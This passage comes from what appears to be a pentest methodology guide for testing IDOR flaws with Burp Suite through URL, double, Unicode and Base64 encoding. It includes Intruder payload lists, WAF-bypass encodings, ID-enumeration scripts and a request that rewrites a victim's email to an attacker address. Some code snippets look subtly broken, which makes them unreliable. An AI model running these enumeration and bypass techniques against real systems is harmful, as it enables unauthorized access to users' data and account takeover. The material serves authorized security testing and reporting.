    if '200 OK' in req.response:
        table.add(req)
```

---

## 🎭 **PHASE 6: Context-Specific Testing**

### **Step 6.1: JSON/XML APIs**

**JSON Request:**
```
POST /api/user/data HTTP/1.1
Content-Type: application/json

{"user_id": 100}
```

**Test with URL Encoded JSON:**
```
POST /api/user/data HTTP/1.1
Content-Type: application/json

{"user_id": "%31%30%30"}

Some APIs might decode this automatically!
```

**XML Request:**
```
POST /api/user/data HTTP/1.1
Content-Type: application/xml

<user><id>100</id></user>
```

**Test with Encoded XML:**
```
POST /api/user/data HTTP/1.1
Content-Type: application/xml

<user><id>%31%30%30</id></user>
```

### **Step 6.2: Query Parameters**

```
Original: /api/data?user=100&type=profile
Test:     /api/data?user=%31%30%30&type=profile
Test:     /api/data?user=100&type=%70%72%6F%66%69%6C%65
Test:     /api/data?%75%73%65%72=%31%30%30&%74%79%70%65=%70%72%6F%66%69%6C%65
```

### **Step 6.3: POST Form Data**

```
POST /api/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user_id=100&action=view
```

**Test encoded:**
```
POST /api/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user_id=%31%30%30&action=%76%69%65%77
```

---

## 📊 **PHASE 7: Advanced Analysis Techniques**

### **Step 7.1: Response Time Analysis**

Use **Burp Intruder** with **Response time analysis**:

```
Options → Response Completion → 
- Set timeout appropriately
- Track response times in results table

Look for:
- Valid IDs: Consistent response times
- Invalid IDs: Quick rejections
- Encoded values: Different timing patterns
```

### **Step 7.2: Content Length Analysis**

Export Intruder results and analyze in Excel:
```python
# Sample analysis script
import csv
from collections import Counter

with open('intruder_results.csv') as f:
    reader = csv.DictReader(f)
    lengths = [r['Length'] for r in reader]
    
    # Find unique content lengths
    length_counts = Counter(lengths)
    unique_lengths = [l for l, c in length_counts.items() if c < 10]
    
    print(f"Potential hits with unique lengths: {unique_lengths}")
```

### **Step 7.3: Automated Scanning with Active Scanner**

```
Right-click request → Do an active scan
Scope: Selected insertion points only
Insertion points: 
- URL path parameters
- Query string parameters
- Body parameters
- Cookie values

Scan configurations:
- Enable "Insert malicious payloads"
- Check "URL encoding" under payload types
```

---

## 🛡️ **PHASE 8: Bypassing WAF/Protections**

### **Step 8.1: WAF Bypass Techniques**

**Case Variation:**
```
Normal: %31%30%30
Mixed case: %31%30%30 (same for hex)
Some WAFs: Try %6d%6f%63%6b (mock) - not applicable for numbers
```

**Alternative Encodings:**
```
UTF-8: Try overlong UTF-8 for '/'
- Not applicable for numbers
- For path: /api/user/%31%30%30

Unicode:
- %u0031%u0030%u0030 (not standard URL encoding)
```

**Padding Techniques:**
```
Add extra characters:
/user/%31%30%00%30 (null byte)
/user/%31%30%0a%30 (line feed)
/user/%31%30%20%30 (space)
```

### **Step 8.2: Using Burp's Decoder**

```
Decoder tab → 
1. Enter value: 100
2. Encode as: URL
3. Copy result: %31%30%30
4. Encode again: URL all
5. Copy result: %2531%2530%2530
```

---

## 📝 **PHASE 9: Documentation & Reporting**

### **Step 9.1: Saving Evidence**

**Save requests/responses:**
```
Right-click request → Save item
Include:
- Full request headers
- Full response
- Timestamp
- Notes on finding
```

**Screenshots:**
```
1. Baseline response (authorized access)
2. Encoded request response (unauthorized access)
3. Highlight differences
```

### **Step 9.2: Generate Report**

```
Project options → Reporting
Create new report:
- Include only confirmed findings
- Add remediation advice
- Include request/response pairs
- Add severity ratings
```

### **Step 9.3: Proof of Concept Script**

```python
import requests
import urllib.parse

def test_url_encoded_idor(base_url, original_id, target_id):
    """
    Test for URL encoded IDOR vulnerability
    """
    session = requests.Session()
    session.cookies.set('session', 'your_session_cookie')
    
    # Encode the target ID
    encoded_id = ''.join([f'%{ord(d):02X}' for d in str(target_id)])
    
    # Test endpoint
    url = f"{base_url}/api/user/{encoded_id}"
    
    response = session.get(url)
    
    if response.status_code == 200:
        print(f"[+] Potential IDOR found! ID: {target_id}")
        print(f"    Encoded: {encoded_id}")
        print(f"    Response length: {len(response.text)}")
        
# Test sequence
for test_id in [101, 102, 103, 200, 500]:
    test_url_encoded_idor("https://example.com", 100, test_id)
```

---

## 🎯 **PHASE 10: Advanced Tools & Techniques**

### **Step 10.1: Burp Collaborator for Blind IDOR**

If IDOR triggers blind actions:
```
1. Generate Collaborator payload
2. Encode the Collaborator URL
3. Inject in ID parameter
4. Monitor Collaborator for interactions
```

### **Step 10.2: Custom Intruder Payloads**

Create complex payloads with Python:

```python
# Generate encoded payload variations
for i in range(1, 101):
    num = str(i)
    
    # Standard encoding
    std_enc = ''.join([f'%{ord(d):02X}' for d in num])
    print(std_enc)
    
    # Double encoding
    dbl_enc = urllib.parse.quote(std_enc)
    print(dbl_enc)
    
    # Mixed case (not applicable for numbers)
    
    # With padding
    padded = f"%00{std_enc}"
    print(padded)
```

### **Step 10.3: Using Burp's Intruder with Multiple Encodings**

**Payload Processing Rules:**
```
1. Add: Add raw payload (100)
2. Add: URL-encode all characters → %31%30%30
3. Add: Add prefix → % (for double? No, better:)

Better sequence for double encoding:
Rule 1: URL-encode all characters → %31%30%30
Rule 2: URL-encode all characters → %2531%2530%2530
```

---

## ✅ **CHECKLIST FOR BUG #11 TESTING**

### **Pre-Testing**
- [ ] Add target to Burp scope
- [ ] Configure proxy settings
- [ ] Set up session handling rules
- [ ] Install relevant extensions

### **Manual Testing**
- [ ] Test basic URL encoding on single parameter
- [ ] Test multiple positions in request
- [ ] Test different encoding levels
- [ ] Test with valid and invalid IDs
- [ ] Document baseline responses

### **Automated Testing**
- [ ] Configure Intruder with encoding payloads
- [ ] Set up grep matches
- [ ] Run through all payload positions
- [ ] Analyze results for anomalies
- [ ] Verify findings manually

### **Advanced Testing**
- [ ] Test double encoding
- [ ] Test mixed encoding techniques
- [ ] Test in different contexts (JSON, XML)
- [ ] Test with WAF bypass techniques
- [ ] Test for blind IDOR scenarios

### **Reporting**
- [ ] Document each finding with evidence
- [ ] Include request/response pairs
- [ ] Provide remediation steps
- [ ] Rate severity based on impact
- [ ] Create proof of concept

---

## 🚨 **COMMON PITFALLS TO AVOID**

1. **Don't assume** all servers decode URL encoding the same way
2. **Don't ignore** response size differences
3. **Don't forget** to test POST parameters too
4. **Don't overlook** cookies and headers
5. **Don't skip** baseline testing
6. **Don't ignore** rate limiting
7. **Don't forget** to clear cookies when testing
8. **Don't test** without authorization

---

## 📚 **RESOURCES FOR FURTHER LEARNING**

- **Burp Suite Documentation**: portswigger.net/burp/documentation
- **OWASP IDOR Guide**: owasp.org/IDOR
- **PortSwigger IDOR Labs**: portswigger.net/web-security/access-control
- **URL Encoding Reference**: w3schools.com/tags/ref_urlencode.asp

---

# 🎯 **Bug #12: Double URL Encoding IDOR - Complete Burp Suite Methodology**

## 📋 **Bug Description**
**Double URL Encoding** IDOR occurs when the application decodes parameters multiple times, allowing attackers to bypass input filters or WAFs by encoding characters twice.

## 🔍 **Understanding Double URL Encoding**

### **How It Works**
```
Original:    id=100
URL Encoded: id=%31%30%30
Double Encoded: id=%2531%2530%2530
```

### **Why It Works**
1. Some applications decode parameters multiple times
2. WAFs may only check single-encoded values
3. Server might apply URL decoding before validation AND before processing

---

## 🛠️ **Complete Burp Suite Methodology**

### **Phase 1: Reconnaissance & Target Identification**

#### **Step 1.1: Map the Application**
1. **Spider the target** using Burp Spider
2. **Browse manually** while Burp records traffic
3. **Identify all parameters** that might contain IDs:
   - `id`, `user_id`, `file_id`, `document_id`
   - `reference`, `ref`, `uid`, `guid`
   - `product`, `order`, `invoice`, `ticket`

#### **Step 1.2: Identify Potential IDOR Points**
Look for:
- **Profile pages**: `/user/profile?id=100`
- **File downloads**: `/download?file=100`
- **API endpoints**: `/api/v1/users/100`
- **Edit forms**: `/edit?post=50`
- **Delete operations**: `/delete?id=200`

---

### **Phase 2: Burp Suite Configuration**

#### **Step 2.1: Set Up Burp**
1. **Configure browser proxy** to 127.0.0.1:8080
2. **Install Burp CA certificate**
3. **Enable Intercept** for initial testing

#### **Step 2.2: Configure Intruder for Double Encoding**
```
Target: /endpoint?parameter=§original_value§
Payload type: Custom iterator
Payload settings:
    Position 1: [Original characters]
    Position 2: [URL encoding]
    Position 3: [Double URL encoding]
```

---

### **Phase 3: Manual Testing Methodology**

#### **Step 3.1: Identify Base Parameter**
```http
GET /api/user/profile?id=100 HTTP/1.1
Host: target.com
Cookie: session=abc123
```

#### **Step 3.2: Test Single URL Encoding**
1. **Send to Repeater** (Ctrl+R)
2. **Encode the ID**:
   - Original: `100`
   - URL Encoded: `%31%30%30`

```http
GET /api/user/profile?id=%31%30%30 HTTP/1.1
Host: target.com
```

3. **Check response**:
   - If 200 OK → Application decodes once
   - If 403/404 → May have WAF/filter

#### **Step 3.3: Test Double URL Encoding**
1. **Double encode the % sign**:
   - `%` → `%25`
   - So `%31` becomes `%2531`

**Process:**
```
Original:     100
URL Encode:   %31%30%30
Double Encode: %2531%2530%2530
```

**Request:**
```http
GET /api/user/profile?id=%2531%2530%2530 HTTP/1.1
Host: target.com
```

#### **Step 3.4: Verify Double Decoding**
1. If double encoded request returns 200
2. Try accessing other user's data:
   - Victim ID: 101
   - Double encode: `101` → `%31%30%31` → `%2531%2530%2531`

```http
GET /api/user/profile?id=%2531%2530%2531 HTTP/1.1
Host: target.com
```

---

### **Phase 4: Burp Intruder Automation**

#### **Step 4.1: Set Up Intruder Attack**
1. **Right-click request** → Send to Intruder
2. **Clear all payload positions** (Ctrl+A, then Ctrl+Shift+Del)
3. **Add position marker** around the numeric ID:
   ```
   GET /api/user/profile?id=§100§
   ```

#### **Step 4.2: Configure Payloads**

**Payload Type: Custom Iterator**

**Payload Set 1 (Digits 0-9):**
```
0,1,2,3,4,5,6,7,8,9
```

**Payload Set 2 (URL Encoding for digits):**
```
%30 = 0
%31 = 1
%32 = 2
%33 = 3
%34 = 4
%35 = 5
%36 = 6
%37 = 7
%38 = 8
%39 = 9
```

**Payload Set 3 (Double URL Encoding):**
```
%2530 = %30 = 0
%2531 = %31 = 1
%2532 = %32 = 2
%2533 = %33 = 3
%2534 = %34 = 4
%2535 = %35 = 5
%2536 = %36 = 6
%2537 = %37 = 7
%2538 = %38 = 8
%2539 = %39 = 9
```

#### **Step 4.3: Configure Attack Settings**
1. **Resource Pool**: Create new pool with 1 thread (avoid rate limiting)
2. **Attack Type**: Sniper (for testing each encoding separately)

---

### **Phase 5: Advanced Intruder Configuration**

#### **Step 5.1: Payload Processing Rules**
Add these processing rules:
1. **Add prefix**: `%` (for single encoding)
2. **Add prefix**: `%25` (for double encoding)
3. **URL encode key characters**

#### **Step 5.2: Grep - Match**
Configure response matching:
- Add "Unauthorized" (to identify blocks)
- Add "Access Denied"
- Add "404 Not Found"
- Add specific user data patterns

#### **Step 5.3: Attack Types for Different Scenarios**

**Sniper Attack** (single payload position):
```
Payload: 100, 101, %31%30%30, %2531%2530%2530
```

**Battering Ram** (same payload in all positions):
```
Payload: 100
Position1: %31%30%30
Position2: %2531%2530%2530
```

**Pitchfork** (multiple payload sets):
```
Set1: 100, 101, 102 (original)
Set2: %31%30%30, %31%30%31, %31%30%32 (encoded)
Set3: %2531%2530%2530, %2531%2530%2531, %2531%2530%2532 (double)
```

---

### **Phase 6: Burp Suite Extensions**

#### **Step 6.1: Recommended Extensions**

1. **Turbo Intruder** - For high-speed attacks
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=5,
                          requestsPerConnection=100,
                          pipeline=False)
    
    for word in wordlists:
        # Generate double encoded payload
        encoded = word.encode('string_escape')
        double_encoded = encoded.replace('%', '%25')
        engine.queue(target.req, double_encoded)
```

2. **Encoder** - Built-in encoding/decoding
   - Use **Decoder** tab for quick encoding
   - Convert: Plain → URL → URL again

3. **Param Miner** - Find hidden parameters
   - Right-click → Extensions → Param Miner
   - Check "Discover parameters with invalid values"

4. **Backslash Powered Scanner** - Detect decoding quirks

---

### **Phase 7: Automated Scanning with Active Scanner**

#### **Step 7.1: Configure Active Scan**
1. **Right-click request** → Do an active scan
2. **Scan configuration** → Customize:
   - Enable "Insertion point types" → All
   - Add custom payloads for double encoding

#### **Step 7.2: Insert Custom Payloads**
Add to **Payloads** list:
```
%2531%2530%2530
%2561%2564%256d%2569%256e
%2572%256f%256f%2574
%2568%2574%2574%2570%253a%252f%252f
```

---

### **Phase 8: Manual Exploitation Techniques**

#### **Step 8.1: Burp Repeater Manual Testing**

**Test Case 1: Numeric ID**
```
Original: /user/100
Test: /user/%2531%2530%2530
Test: /user/%25%33%31%25%33%30%25%33%30 (partial encoding)
```

**Test Case 2: Alphanumeric IDs**
```
Original: doc=ABC123
URL Encoded: doc=%41%42%43%31%32%33
Double Encoded: doc=%2541%2542%2543%2531%2532%2533
```

**Test Case 3: Path-based IDs**
```
Original: /files/report_2024.pdf
URL Encoded: /files/report_%32%30%32%34.pdf
Double Encoded: /files/report_%2532%2530%2532%34.pdf
```

#### **Step 8.2: Testing Different HTTP Methods**
```http
# GET request
GET /api/user/%2531%2530%2531 HTTP/1.1

# POST with encoded parameter
POST /api/user HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=%2531%2530%2531

# JSON with double encoded value
POST /api/user HTTP/1.1
Content-Type: application/json

{"id": "%2531%2530%2531"}
```

---

### **Phase 9: Bypassing WAFs with Double Encoding**

#### **Step 9.1: Progressive Encoding**
Try these variations:
```
Level 1: %31%30%31
Level 2: %2531%2530%2531
Level 3: %252531%252530%252531
Level 4: %25252531%25252530%25252531
```

#### **Step 9.2: Mixed Encoding**
```
Original: 101
Mixed: %2531%30%2531
Mixed: %31%2530%31
Mixed: %25%33%31%30%25%33%31
```

#### **Step 9.3: Case Variation**
```
Standard: %2531%2530%2531
Uppercase: %2531%2530%2531 (same)
Mixed case: %25%33%31%25%33%30%25%33%31
```

---

### **Phase 10: Exploitation Chain**

#### **Step 10.1: Identify User ID Pattern**
1. Create 2 accounts: UserA, UserB
2. Note UserA ID: 10001
3. Note UserB ID: 10002
4. Test double encoding for UserB from UserA session

#### **Step 10.2: Escalate Impact**

**Profile Data Access:**
```http
GET /api/user/profile?id=%2531%2530%2530%2530%2532 HTTP/1.1
```

**Sensitive Documents:**
```http
GET /api/documents?user_id=%2531%2530%2530%2530%2532 HTTP/1.1
```

**Account Settings:**
```http
POST /api/user/update HTTP/1.1
Content-Type: application/json

{
  "user_id": "%2531%2530%2530%2530%2532",
  "email": "attacker@evil.com"
}
```

---

### **Phase 11: Detection & Validation**

#### **Step 11.1: Response Analysis in Burp**

**Successful exploitation indicators:**
- **200 OK** with other user's data
- **302 Redirect** to authenticated area
- **Content-Length** different from unauthorized response
- **Response time** different (timing attack)

**Failed exploitation indicators:**
- **403 Forbidden** (WAF blocked)
- **404 Not Found** (ID invalid)
- **302 to Login** (session invalid)
- Custom error messages

#### **Step 11.2: Use Comparer Tool**
1. Send two responses to Comparer
2. Compare:
   - Legitimate access to own data
   - Attempted access to victim data
3. Look for identical responses (success)

---

### **Phase 12: Reporting Template**

```markdown
## IDOR via Double URL Encoding

**Vulnerability:** Insecure Direct Object Reference
**Technique:** Double URL Encoding Bypass
**Endpoint:** /api/user/profile
**Parameter:** id

### Steps to Reproduce:
1. Login as user `attacker` (ID: 100)
2. Capture request to `/api/user/profile?id=100`
3. Double encode victim ID `101` to `%2531%2530%2531`
4. Send request: `GET /api/user/profile?id=%2531%2530%2531`
5. Observe successful retrieval of victim's profile

### Impact:
- Unauthorized access to other users' personal data
- Potential for account takeover
- Data breach of sensitive information

### Proof of Concept:
[Burp Request/Response screenshot]

### Remediation:
- Implement proper access controls server-side
- Apply URL decoding only once at the application level
- Use indirect reference maps (UUIDs instead of sequential IDs)
- Validate user permissions for every request

### CVSS Score: 7.5 (High)
Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
```

---

## 🎯 **Pro Tips**

### **Tip 1: Burp Macros for Double Encoding**
Create a macro that automatically double encodes:
1. **Project options** → **Sessions** → **Macros**
2. Add macro to encode selected parameter
3. Apply to all outgoing requests

### **Tip 2: Session Handling Rules**
Create rule to handle tokens after double encoding:
1. **Session Handling Rules** → **Add**
2. Rule: "Update Cookie with latest value"
3. Scope: All tools

### **Tip 3: Custom Payload Generator**
Use **Extension** (Python) to generate double encoded payloads:
```python
from burp import IBurpExtender, IIntruderPayloadGeneratorFactory
import urllib

class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        callbacks.registerIntruderPayloadGeneratorFactory(self)
        
    def createNewInstance(self, attack):
        return DoubleEncodeGenerator()
    
class DoubleEncodeGenerator:
    def getNextPayload(self, base_value):
        # Double encode the payload
        once = urllib.quote(base_value)
        twice = urllib.quote(once)
        return twice
```

---

## 📊 **Testing Checklist**

- [ ] Identify all ID parameters
- [ ] Test single URL encoding
- [ ] Test double URL encoding
- [ ] Test progressive encoding (3+ levels)
- [ ] Test mixed encoding levels
- [ ] Test different parameter locations
- [ ] Test different HTTP methods
- [ ] Document all successful bypasses
- [ ] Verify impact with multiple victims
- [ ] Create proof of concept
- [ ] Write detailed report

---

## ⚠️ **Important Considerations**

### **Legal & Ethical**
- Only test on authorized targets
- Stop if you encounter PII
- Report findings responsibly
- Don't exfiltrate data

### **Technical Limitations**
- Rate limiting may block attacks
- WAF may detect encoding patterns
- Some apps normalize input
- Logging may reveal your tests

### **When It Works Best**
- Legacy applications
- Custom frameworks
- Multiple decoding layers
- Weak input validation
- Missing WAF rules

---

## 🎓 **Practice on These Labs**
1. PortSwigger: "IDOR with double encoding"
2. PentesterLab: "Encoding IDOR"
3. OWASP WebGoat: "Insecure Direct Object References"
4. HackTheBox: "Encoding" machine

---

# 🎯 **Bug #13: Unicode Encoding IDOR - Complete Burp Suite Methodology**

## 📋 **Bug Description**
**IDOR via Unicode-encoded parameter manipulation** - Testing if the application improperly handles Unicode-encoded object references, allowing access to unauthorized resources.

---

## 🔍 **DETECTION PHASE**

### **Step 1: Identify Potential IDOR Points**
1. **Map the application**:
   - Navigate through all authenticated areas
   - Look for URLs/parameters containing:
     - `id`, `user_id`, `account_id`, `document_id`
     - `file`, `download`, `view`, `edit`, `delete`
     - `/api/users/`, `/profile/`, `/orders/`

2. **Burp Configuration**:
```
Target → Site Map → Right-click → Add to Scope
Proxy → Intercept → Turn on
```

### **Step 2: Baseline Request Collection**
1. **Capture a normal request**:
```http
GET /api/user/profile?id=100 HTTP/1.1
Host: example.com
Cookie: session=abc123
```

2. **Test basic IDOR first**:
   - Send to Repeater
   - Change `id=100` to `id=101`
   - Note response (200 vs 403)

---

## 🧪 **TESTING PHASE FOR UNICODE ENCODING**

### **Step 3: Unicode Encoding Preparation**

#### **Unicode Encodings for Common IDs:**

**For ID: 100**
```
Standard: 100
Unicode: \u0031\u0030\u0030
URL-encoded Unicode: %u0031%u0030%u0030
HTML Unicode: &#49;&#48;&#48;
UTF-8 hex: \x31\x30\x30
UTF-16: \u0031\u0030\u0030
UTF-32: \U00000031\U00000030\U00000030
```

**For ID: 101**
```
Standard: 101
Unicode: \u0031\u0030\u0031
URL-encoded: %u0031%u0030%u0031
```

### **Step 4: Burp Intruder Setup for Unicode Testing**

#### **Intruder Attack 1: Direct Unicode**
1. **Send request to Intruder** (Ctrl+I)
2. **Positions tab**:
```
GET /api/user/profile?id=§100§
```

3. **Payloads tab**:
```
Payload type: Simple list
Payload options:
\u0031\u0030\u0030
\u0031\u0030\u0031
%u0031%u0030%u0030
%u0031%u0030%u0031
&#49;&#48;&#48;
&#49;&#48;&#49;
\x31\x30\x30
\x31\x30\x31
```

4. **Attack Settings**:
```
Resource Pool: Create new (20 threads)
Grep - Extract: Add response body markers
Grep - Match: "unauthorized", "forbidden", "error"
```

---

### **Step 5: Advanced Unicode Bypass Techniques**

#### **Technique A: Mixed Encoding**
Create a payload list for incremental IDs:
```python
# Generate payload.py
for i in range(100, 110):
    # UTF-8
    utf8 = ''.join(['\\x' + hex(ord(d))[2:].zfill(2) for d in str(i)])
    # UTF-16
    utf16 = ''.join(['\\u' + hex(ord(d))[2:].zfill(4) for d in str(i)])
    # HTML Entity
    html = ''.join(['&#' + str(ord(d)) + ';' for d in str(i)])
    # URL-encoded Unicode
    url_uni = ''.join(['%u' + hex(ord(d))[2:].zfill(4) for d in str(i)])
    
    print(f"{i} -> {utf8} | {utf16} | {html} | {url_uni}")
```

#### **Technique B: Burp Intruder with Custom Payload Processing**

1. **Payloads tab → Payload Processing**:
```
Add: Encode → URL-encode key characters
Add: Encode → HTML-encode
Add: Encode → Unicode-escape (Custom)
```

2. **Custom Unicode Function**:
```python
# Extender → Python environment
def process_payload(payload):
    # Convert "100" to \u0031\u0030\u0030
    return ''.join(['\\u' + format(ord(c), '04x') for c in payload])
```

---

### **Step 6: Burp Repeater Manual Testing**

#### **Test Cases to Run Manually:**

1. **Basic Unicode Escaping**:
```
Request 1: GET /api/user/profile?id=100
Request 2: GET /api/user/profile?id=\u0031\u0030\u0030
Request 3: GET /api/user/profile?id=\u0031\u0030\u0031
```

2. **Double-Encoded Unicode**:
```
Request: GET /api/user/profile?id=%25u0031%25u0030%25u0030
```

3. **Mixed Encoding Types**:
```
Request: GET /api/user/profile?id=&#49;\u0030%30
```

4. **Overlong UTF-8 Sequences**:
```
For '1': %C0%B1 (overlong)
For '0': %C0%B0 (overlong)
Request: GET /api/user/profile?id=%C0%B1%C0%B0%C0%B0
```

5. **Invalid Unicode Handling**:
```
Request: GET /api/user/profile?id=\u0031\u0030\u003z
Request: GET /api/user/profile?id=\u0031\u0030\ud800
```

---

## 🔬 **ANALYSIS PHASE**

### **Step 7: Response Analysis**

#### **What to Look For:**

1. **Successful Exploit Indicators**:
```http
HTTP/1.1 200 OK
Content-Type: application/json
{
    "user": {
        "id": 101,
        "email": "victim@example.com",
        "data": "sensitive information"
    }
}
```

2. **Partial Information Disclosure**:
```http
HTTP/1.1 200 OK
Content-Type: text/html
<!-- User ID: 101 found in comment -->
```

3. **Error Message Leakage**:
```http
HTTP/1.1 500 Internal Server Error
Invalid user ID: 101
```

### **Step 8: Burp Comparer for Response Diff**

1. **Select two requests**:
   - Original authorized request (ID 100)
   - Unicode-encoded attempt for ID 101

2. **Send to Comparer**:
```
Right-click → Send to Comparer
Word comparison or Byte comparison
```

3. **Analyze differences**:
   - Similar length = possible success
   - Key terms appearing: user email, private data
   - Missing "unauthorized" messages

---

## 📊 **AUTOMATED SCANNING**

### **Step 9: Burp Active Scan with Custom Checks**

1. **Create BCheck (Burp Check)**:
```javascript
// Extender → BCheck Studio
{
  name: "Unicode IDOR Detection";
  type: "active";
  description: "Tests for Unicode-encoded IDOR vulnerabilities";
  
  run for: each request;
  
  // Test payloads
  define unicode_payloads = [
    "\u0031\u0030\u0030",
    "\u0031\u0030\u0031",
    "%u0031%u0030%u0030",
    "&#49;&#48;&#48;",
    "\x31\x30\x30"
  ];
  
  // Check response
  if (response.status == 200 && 
      response.length > original.length * 0.8) {
    report issue(
      severity: "High",
      confidence: "Firm",
      description: "Unicode IDOR Bypass Possible"
    );
  }
}
```

### **Step 10: Intruder Cluster Bomb Attack**

For testing multiple IDs with multiple encodings:

1. **Positions**:
```
GET /api/user/profile?id=§100§§_ENCODING_§
```

2. **Payload Set 1 (IDs)**:
```
100, 101, 102, 103, 104, 105
```

3. **Payload Set 2 (Encodings)**:
```
none,\u,\u0025u,&#x;,&#;
```

4. **Payload Processing**:
```
Combine payloads with custom delimiter
```

---

## 🔧 **ADVANCED BURP TECHNIQUES**

### **Step 11: Session Handling Rules**

1. **Add MACRO for authentication**:
```
Project options → Sessions → Session Handling Rules
Add rule → Run a macro
Select login sequence
```

2. **Cookie handling**:
```
Add rule → Check session valid
If invalid → Run macro
Update cookies automatically
```

### **Step 12: Turbo Intruder for Speed**

```python
# Turbo Intruder script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False)

    ids = ['100', '101', '102', '103', '104']
    encodings = ['', '\\u0031', '%u0031', '&#49;']
    
    for id in ids:
        for enc in encodings:
            engine.queue(target.req, [id, enc])
            
    engine.start(timeout=10)

def handleResponse(req, interesting):
    if '200' in req.response and len(req.response) > 1000:
        table.add(req)
```

---

## 📝 **DOCUMENTATION & REPORTING**

### **Step 13: Proof of Concept Template**

```markdown
# IDOR via Unicode Encoding

## Vulnerability Details
- **Bug ID**: #13 (Unicode Encoding IDOR)
- **Endpoint**: /api/user/profile
- **Parameter**: id
- **Original ID**: 100 (victim@example.com)
- **Target ID**: 101 (admin@example.com)

## Exploit Steps
1. Log in as user (ID: 100)
2. Capture request to /api/user/profile
3. Modify parameter: id=\u0031\u0030\u0031
4. Forward request
5. Observe unauthorized access

## HTTP Request
\`\`\`http
GET /api/user/profile?id=\u0031\u0030\u0031 HTTP/1.1
Host: example.com
Cookie: [valid_session]
\`\`\`

## HTTP Response (Sensitive Data)
\`\`\`json
{
    "id": 101,
    "email": "admin@example.com",
    "role": "administrator",
    "private_data": "..."
}
\`\`\`

## Impact
Unauthorized access to admin account data
Potential privilege escalation
Data breach risk

## Remediation
- Implement proper access controls
- Use indirect reference maps
- Validate Unicode decoding
- Apply consistent authorization checks
```

---

## 🎯 **SUCCESS INDICATORS**

### **Green Flags (Vulnerable)**
- ✅ 200 OK with different user's data
- ✅ Partial information disclosure
- ✅ Different content length than unauthorized
- ✅ "Welcome [different username]"
- ✅ Admin panel access

### **Red Flags (Not Vulnerable)**
- ❌ 403 Forbidden
- ❌ 302 Redirect to login
- ❌ "Unauthorized" message
- ❌ Same content as original
- ❌ Input validation error

---

## 🛡️ **TESTING CHECKLIST**

```
[ ] Identify all parameter-based endpoints
[ ] Capture baseline requests
[ ] Test basic IDOR first
[ ] Generate Unicode payloads
[ ] Configure Burp Intruder
[ ] Run multiple encoding variations
[ ] Check response differences
[ ] Verify with Burp Comparer
[ ] Document successful attempts
[ ] Create POC video/screenshots
[ ] Report with impact assessment
```

---

## ⚡ **PRO TIPS**

1. **Use Burp Extensions**:
   - Hackvertor (for encoding/decoding)
   - J2EEScan (for additional checks)
   - Active Scan++ (enhanced scanning)

2. **Combine with Other Bugs**:
   - Unicode bypass + Race condition
   - Unicode + Parameter pollution

3. **Monitor Response Times**:
   - Unicode decoding might cause delays
   - 500 errors indicate processing

4. **Check Logs/Error Pages**:
   - Unicode decoding errors might leak info
   - Stack traces with IDs

---

# 🔍 **Bug #14: Base64 Encoded IDOR - Complete Burp Suite Methodology**

## 📌 **Bug Description**
**IDOR vulnerability where object references are encoded in Base64** (e.g., `id=MTIz` where MTIz = "123"). This encoding provides false sense of security but is easily reversible.

---

## 🎯 **Target Pattern Examples**
```http
GET /api/user/MTIz           # Base64 of "123"
GET /profile?id=NDU2          # Base64 of "456"
POST /api/data MTAwCg==       # Base64 of "100\n"
Cookie: user=am9obg==         # Base64 of "john"
```

---

## 📊 **PHASE 1: RECONNAISSANCE & IDENTIFICATION**

### **Step 1: Configure Burp Suite**

1. **Set up Target Scope**
```
1. Open Burp → Target → Scope
2. Add target domain (e.g., *.example.com)
3. Check "Use advanced scope control"
4. Include: ^https?://.*\.example\.com/.*
```

2. **Configure Proxy**
```
1. Proxy → Options → Proxy Listeners
2. Ensure intercept is on
3. Set up FoxyProxy/ browser proxy
```

3. **Load Extensions** (Extender → BApp Store)
```
- Base64 Decoder (for automatic detection)
- Hackvertor (for encoding/decoding)
- Turbo Intruder (for faster attacks)
- Custom Parameter Handler
```

---

### **Step 2: Spider the Application**

```
1. Target → Site map → Right-click domain
2. Select "Spider this host"
3. Configure spider:
   - Check "Don't stop spider"
   - Max links: 1000
   - Max depth: 5
4. Start spidering
```

### **Step 3: Passive Scan for Base64 Patterns**

**Create Passive Scan Check:**
```python
# Extender → Extensions → Add (Python)
def doPassiveScan(basePairResponse, insertedScanCheck):
    # Check for Base64 patterns in requests
    request = basePairResponse.getRequest()
    if b"eyJ" in request or b"==" in request:
        # Looks like Base64, flag for manual review
        return [ScanIssue(...)]
```

---

## 🔍 **PHASE 2: MANUAL DETECTION TECHNIQUES**

### **Step 4: Manual Parameter Inspection**

**Method A: Proxy History Review**
```
1. Proxy → HTTP History
2. Filter by MIME type: all
3. Search parameters containing:
   - "id="
   - "user="
   - "file="
   - "doc="
   - "ref="
4. Look for strings ending with "=" or "=="
```

**Method B: Engagement Tools**
```
1. Right-click interesting request
2. Engagement tools → Find references
3. Check all parameters
4. Use "Discover content" for hidden endpoints
```

### **Step 5: Base64 Detection Script**

**Create Intruder Payload for Detection:**
```python
# Payload to identify Base64 parameters
def detect_base64_parameters(request):
    import re
    import base64
    
    # Regex for potential Base64
    b64_pattern = r'[A-Za-z0-9+/]{4,}={0,2}'
    
    params = extract_parameters(request)
    for param in params:
        if re.match(b64_pattern, param):
            try:
                decoded = base64.b64decode(param)
                print(f"Found Base64: {param} -> {decoded}")
                return True
            except:
                pass
    return False
```

---

## 🎯 **PHASE 3: ACTIVE TESTING**

### **Step 6: Burp Intruder Attack Setup**

**Create Custom Attack:**
```
1. Send request to Intruder (Ctrl+I)
2. Positions tab → Clear §
3. Highlight Base64 value → Add §
4. Select Attack type: Sniper
```

**Payload Generation Rules:**

```python
# Custom Payload Generator for Base64 IDOR
def generate_payloads(base_value):
    payloads = []
    
    # Original encoded value
    original = base64.b64encode(str(base_value).encode()).decode()
    payloads.append(original)
    
    # Sequential IDs
    for i in range(base_value-20, base_value+21):
        if i > 0:
            encoded = base64.b64encode(str(i).encode()).decode()
            payloads.append(encoded)
    
    # Common IDs
    common_ids = [1, 100, 500, 999, 1000, 5000]
    for id in common_ids:
        payloads.append(base64.b64encode(str(id).encode()).decode())
    
    # Edge cases
    edge_cases = ['0', '-1', '999999999', 'admin', 'root']
